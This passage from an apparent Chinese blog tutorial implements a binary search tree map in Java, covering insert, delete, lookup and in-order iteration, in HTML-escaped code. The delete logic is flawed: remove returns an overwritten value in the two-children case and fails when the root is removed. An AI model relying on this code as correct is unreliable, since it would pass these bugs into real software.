                currentNode =&lt;span&gt; currentNode.right;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(compareResult &amp;lt; 0&lt;span&gt;){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前key 小于currentNode 指向右边节点&lt;/span&gt;
                currentNode =&lt;span&gt; currentNode.left;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; TargetEntryNode&amp;lt;&amp;gt;&lt;span&gt;(currentNode, parent, RelativePosition.CURRENT);
            }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::没有找到目标节点&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(compareResult &amp;gt; 0&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回 右孩子 哨兵节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; TargetEntryNode&amp;lt;&amp;gt;(&lt;span&gt;null&lt;/span&gt;&lt;span&gt;, parent, RelativePosition.RIGHT);
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(compareResult &amp;lt; 0&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回 左孩子 哨兵节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; TargetEntryNode&amp;lt;&amp;gt;(&lt;span&gt;null&lt;/span&gt;&lt;span&gt;, parent, RelativePosition.LEFT);
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;状态异常&quot;&lt;span&gt;);
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * key值进行比较
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @SuppressWarnings(&lt;/span&gt;&quot;unchecked&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; compare(K k1,K k2){
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::迭代器不存在&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.comparator == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::依赖对象本身的 Comparable，可能会转型失败&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; ((Comparable) k1).compareTo(k2);
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::通过迭代器逻辑进行比较&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.comparator.compare(k1,k2);
        }
    }

 　　&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 判断双亲节点和目标节点 相对位置
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; parent    双亲节点
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; target    目标节点
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;          相对位置(左孩子/右孩子)
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; RelativePosition getRelativeByParent(EntryNode&amp;lt;K,V&amp;gt; parent,EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; target){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(parent.left ==&lt;span&gt; target){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; RelativePosition.LEFT;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(parent.right ==&lt;span&gt; target){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; RelativePosition.RIGHT;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;不是父子节点关系&quot;&lt;span&gt;);
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得当前节点的直接后继
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; targetEntryNode     当前节点
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;              当前节点的直接后继
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt; getSuccessor(EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; targetEntryNode){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前节点为null，则后继也为null&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前节点是否存在右孩子&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(targetEntryNode.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::存在右孩子，右子树的最左节点为直接后继&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; rightChildSuccessor =&lt;span&gt; targetEntryNode.right;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::循环往复，直至直接右孩子的最左节点&lt;/span&gt;
            &lt;span&gt;while&lt;/span&gt;(rightChildSuccessor.left != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
                rightChildSuccessor &lt;/span&gt;=&lt;span&gt; rightChildSuccessor.left;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; rightChildSuccessor;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::不存在右孩子，寻找第一个靠右的双亲节点&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; parent =&lt;span&gt; targetEntryNode.parent;
            EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; child =&lt;span&gt; targetEntryNode;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前孩子节点是否是双亲节点的左孩子&lt;/span&gt;
            &lt;span&gt;while&lt;/span&gt;(parent != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; parent.right ==&lt;span&gt; child){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::不是左孩子，而是右孩子，继续向上寻找&lt;/span&gt;
                child =&lt;span&gt; parent;
                parent &lt;/span&gt;=&lt;span&gt; parent.parent;
            }

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; parent;
        }
    }
    
    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 获得二叉搜索树的第一个节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; getFirstNode(){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::空树，返回null&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;br/&gt;EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; entryNode = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.root;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::循环往复，寻找整棵树的最左节点(最小节点、第一个节点)&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(entryNode.left != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            entryNode &lt;/span&gt;=&lt;span&gt; entryNode.left;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; entryNode;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.4 二叉搜索树插入接口实现&lt;/h3&gt;
&lt;p&gt;　　二叉搜索树的插入接口复用了前面提到的&lt;strong&gt;getTargetEntryNode&lt;/strong&gt;方法，以二分查找的方式进行查询。&lt;/p&gt;
&lt;p&gt;　　当key值对应的目标节点存在时，替换掉之前的value。&lt;/p&gt;
&lt;p&gt;　　当key值对应的目标节点不存在时，运用哨兵的思想，通过双亲节点和哨兵节点的相对位置，在目标位置插入一个新的节点。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V put(K key, V value) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.root = &lt;span&gt;new&lt;/span&gt; EntryNode&amp;lt;&amp;gt;&lt;span&gt;(key,value);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.size++&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::获得目标节点&lt;/span&gt;
        TargetEntryNode&amp;lt;K,V&amp;gt; targetEntryNode =&lt;span&gt; getTargetEntryNode(key);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition ==&lt;span&gt; RelativePosition.CURRENT){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点存在于当前容器

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::暂存之前的value&lt;/span&gt;
            V oldValue =&lt;span&gt; targetEntryNode.target.value;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::替换为新的value&lt;/span&gt;
            targetEntryNode.target.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回之前的value&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点不存在于当前容器&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; parent =&lt;span&gt; targetEntryNode.parent;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition ==&lt;span&gt; RelativePosition.LEFT){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点位于左边&lt;/span&gt;
                parent.left = &lt;span&gt;new&lt;/span&gt; EntryNode&amp;lt;&amp;gt;&lt;span&gt;(key,value,parent);
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::目标节点位于右边&lt;/span&gt;
                parent.right = &lt;span&gt;new&lt;/span&gt; EntryNode&amp;lt;&amp;gt;&lt;span&gt;(key,value,parent);
            }

            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.size++&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.5 二叉搜索树删除接口实现&lt;/h3&gt;
&lt;p&gt;　　二叉搜索树节点在被删除时，被删除节点存在三种情况：&lt;/p&gt;
&lt;p&gt;1.&lt;strong&gt;不存在任何孩子节点&lt;/strong&gt;(既没有左孩子，也没有右孩子)&lt;/p&gt;
&lt;p&gt;　　直接将双亲节点和当前节点的连接切断(双亲对应孩子节点引用置为null)。&lt;/p&gt;
&lt;p&gt;2.&lt;strong&gt;只存在一个孩子节点&lt;/strong&gt;(只存在左孩子或者只存在右孩子)&lt;/p&gt;
&lt;p&gt;　　被删除节点唯一的孩子节点代替被删除节点本身，唯一的孩子节点和双亲节点直接相连。&lt;/p&gt;
&lt;p&gt;3.&lt;strong&gt;既有左孩子节点，又有右孩子节点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;/strong&gt;找到被删除节点的直接后继节点(直接前驱节点也行，本质上是保证删除之后依然保证有序性)，将被删除节点和其直接后继交换位置。&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;当右孩子节点存在时，直接后继节点必定存在于右子树中，并且其直接后继一定不存在左孩子节点(否则就不是直接后继节点了)，因此被删除节点的直接后继节点至多只存在一个右孩子节点(或没有任何孩子节点)&lt;/strong&gt;。在两者交换位置后，可以转换为第一或第二种情况进行处理。　&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;节点删除前：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1506329/201901/1506329-20190121215701222-496138561.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.无孩子节点的删除：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1506329/201901/1506329-20190121215937196-207447302.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 只有一个孩子节点的删除：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1506329/201901/1506329-20190121220232988-1546271216.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. 拥有两个孩子的节点的删除：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1506329/201901/1506329-20190121220733695-1356900452.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二叉搜索树节点删除代码实现：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V remove(K key) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::查询目标节点&lt;/span&gt;
        TargetEntryNode&amp;lt;K,V&amp;gt; targetEntryNode =&lt;span&gt; getTargetEntryNode(key);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition !=&lt;span&gt; RelativePosition.CURRENT){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::没有找到目标节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::找到了目标节点

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::从二叉树中删除目标节点&lt;/span&gt;
&lt;span&gt;            deleteEntryNode(targetEntryNode.target);

　　　　　　  &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; targetEntryNode.target.value;
        }
    }

   &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 将目标节点从二叉搜索树中删除
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; target 需要被删除的节点
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; deleteEntryNode(EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; target){
        &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt;
         * 删除二叉搜索树节点
         *     1.无左右孩子
         *         直接删除
         *     2.只有左孩子或者右孩子
         *         将唯一的孩子和parent节点直接相连
         *     3.既有左孩子，又有右孩子
         *         找到自己的直接前驱/后继（左侧的最右节点/右侧的最左节点）
         *         将自己和直接后继进行交换，转换为第1或第2种情况，并将自己删除
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;

        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::size自减1&lt;/span&gt;
        size--&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::既有左孩子，又有右孩子&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(target.left != &lt;span&gt;null&lt;/span&gt; &amp;amp;&amp;amp; target.right != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::找到直接后继(右侧的最左节点)&lt;/span&gt;
            EntryNode&amp;lt;K,V&amp;gt; targetSuccessor =&lt;span&gt; getSuccessor(target);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::target的key/value和自己的后继交换&lt;/span&gt;
            target.key =&lt;span&gt; targetSuccessor.key;
            target.value &lt;/span&gt;=&lt;span&gt; targetSuccessor.value;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::target指向自己的后继，转换为第一/第二种情况&lt;/span&gt;
            target =&lt;span&gt; targetSuccessor;
        }

        EntryNode&lt;/span&gt;&amp;lt;K,V&amp;gt; parent =&lt;span&gt; target.parent;
        RelativePosition relativePosition &lt;/span&gt;=&lt;span&gt; getRelativeByParent(parent,target);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::获得代替被删除节点原先位置的节点(从左右孩子中选择一个)&lt;/span&gt;
        EntryNode&amp;lt;K,V&amp;gt; replacement = (target.left != &lt;span&gt;null&lt;/span&gt; ?&lt;span&gt; target.left : target.right);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(replacement == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::无左右孩子

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::直接删除,断开和双亲节点的联系&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(relativePosition ==&lt;span&gt; RelativePosition.LEFT){
                parent.left &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                parent.right &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            }

            target.parent &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::只有左孩子或者右孩子&lt;/span&gt;
            replacement.parent =&lt;span&gt; target.parent;

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::被删除节点的双亲节点指向被代替的节点&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(relativePosition ==&lt;span&gt; RelativePosition.LEFT){
                parent.left &lt;/span&gt;=&lt;span&gt; replacement;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                parent.right &lt;/span&gt;=&lt;span&gt; replacement;
            }
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.6 二叉搜索树查询接口实现&lt;/h3&gt;
&lt;p&gt;　　二叉搜索树的查询接口使用了getTargetEntryNode方法。&lt;/p&gt;
&lt;p&gt;　　当返回的相对位置为Current时，代表找到了目标节点，直接返回value；反之代表目标节点不存在，返回null。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; V get(K key) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;.root == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::查询目标节点&lt;/span&gt;
        TargetEntryNode&amp;lt;K,V&amp;gt; targetEntryNode =&lt;span&gt; getTargetEntryNode(key);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(targetEntryNode.relativePosition !=&lt;span&gt; RelativePosition.CURRENT){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::没有找到目标节点&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; targetEntryNode.target.value;
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;3.7 二叉搜索树其它接口实现&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsKey(K key) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (get(key) != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; containsValue(V value) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::寻找到第一个节点&lt;/span&gt;
        EntryNode&amp;lt;K,V&amp;gt; entryNode =&lt;span&gt; getFirstNode();

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::从第一个节点开始，遍历整颗二叉搜索树&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(entryNode != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;(Objects.equals(entryNode.value,value)){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::当前节点value匹配，返回true&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::指向下一个直接后继节点&lt;/span&gt;
                entryNode =&lt;span&gt; getSuccessor(entryNode);
            }
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::遍历整颗树之后，还未匹配，返回false&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.size;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isEmpty() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (&lt;span&gt;this&lt;/span&gt;.size == 0&lt;span&gt;);
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.size = 0&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.root = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String toString(){
        Iterator&lt;/span&gt;&amp;lt;Map.EntryNode&amp;lt;K,V&amp;gt;&amp;gt; iterator = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.iterator();

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::空容器&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;iterator.hasNext()){
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;[]&quot;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::容器起始使用&quot;[&quot;&lt;/span&gt;
        StringBuilder s = &lt;span&gt;new&lt;/span&gt; StringBuilder(&quot;[&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::反复迭代&lt;/span&gt;
        &lt;span&gt;while&lt;/span&gt;(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;){
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::获得迭代的当前元素&lt;/span&gt;
            Map.EntryNode&amp;lt;K,V&amp;gt; data =&lt;span&gt; iterator.next();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::判断当前元素是否是最后一个元素&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;iterator.hasNext()){
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::是最后一个元素，用&quot;]&quot;收尾&lt;/span&gt;
                s.append(data).append(&quot;]&quot;&lt;span&gt;);
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::返回 拼接完毕的字符串&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt;&lt;span&gt; s.toString();
            }&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::不是最后一个元素
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;:::使用&quot;, &quot;分割，拼接到后面&lt;/span&gt;
                s.append(data).append(&quot;, &quot;&lt;span&gt;);
            }
        }
    }

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Iterator&amp;lt;Map.EntryNode&amp;lt;K, V&amp;gt;&amp;gt;&lt;span&gt; iterator() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Itr();
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　1. 二叉搜索树从最左节点开始，以中序遍历的方式遍历整颗树&lt;/p&gt;
&lt;p&gt;　　2. 在迭代器初始化时，迭代器指向最小的节点(也就是最左节点)&lt;/p&gt;
&lt;p&gt;　　3. 迭代器迭代时，下一个节点总是指向当前节点的直接后继&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
  &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 二叉搜索树 迭代器实现
     * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Itr &lt;span&gt;implements&lt;/span&gt; Iterator&amp;lt;Map.EntryNode&amp;lt;K,V&amp;gt;&amp;gt;&lt;span&gt;{
        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 当前迭代节点
         * &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
        &lt;span&gt;private&lt;/span&gt; EntryNode&amp;lt;K,V&amp;gt;&lt;span&gt; currentNode;

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 下一个节点
